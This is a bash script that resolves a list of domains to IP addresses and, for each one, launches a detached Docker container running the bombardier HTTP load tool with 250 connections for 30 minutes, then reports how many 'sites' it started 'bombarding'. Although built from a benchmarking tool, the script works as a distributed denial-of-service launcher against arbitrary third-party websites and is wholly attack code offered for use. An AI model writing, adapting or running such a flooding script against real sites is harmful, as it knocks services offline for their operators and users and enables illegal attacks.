#!/bin/bash
source libs/*.sh

connections=250
duration=1800
domains_filename=domains.txt
ips_filename=ips.txt

function parse_args {
	while [ : ]
	do
		OPT=$1
		OPTARG=$2

		if [ -z $OPT ]
		then
			break
		fi

		case $OPT in
			-d | --duration)
				duration=$OPTARG

				shift 2
				;;
			-df | --domains_file)
				domains_filename=$OPTARG

				shift 2
				;;
			-c | --connections)
				connections=$OPTARG

				shift 2
				;;
			-h | --help)
				echo "Usage: $(basename $0) [-d SECONDS] [-c CONNECTIONS] [-df FILENAME]"
				shift
				exit 0
				;;
			*)
				echo "Invalid arg '$OPT' given"
				shift
				exit 1
				;;
		esac
	done
}

function validate_args {
	re_isanum='^[0-9]+$'

	if ! { [[ $duration =~ $re_isanum ]] && [[ $duration -ge 1 ]]; }
	then
		echo "Duration should be a positive number greater than 0"
		exit 1
	fi

	if ! { [[ $connections =~ $re_isanum ]] && [[ $connections -ge 1 ]]; }
	then
		echo "Connections should be a positive number greater than 0"
		exit 1
	fi
}

function main {
	parse_args $@

	validate_args

	echo "Pulling Docker image"

	# validate docker is installed
	docker pull alpine/bombardier

	if [ $? -ne 0 ]
	then
		echo "Something went wrong while getting Docker image"
		exit 1
	fi

	echo "Domains file - $domains_filename"

	# generate ips file
	parse_dns_records_for_domains $domains_filename $ips_filename

	bombarding_count=0

	function cb {
		ip=$1
		url="http://$ip"

		docker run -d alpine/bombardier -c $connections -d "${duration}s" -l $url &>-
			
		if [ $? -ne 0 ]
		then
			continue
		fi

		echo "Started bombarding $url with $connections connections for $duration seconds"
		((bombarding_count++))
	}

	read_file $ips_filename cb

	echo "Successfully started bombarding $bombarding_count sites!"
	exit 0
}

main $@
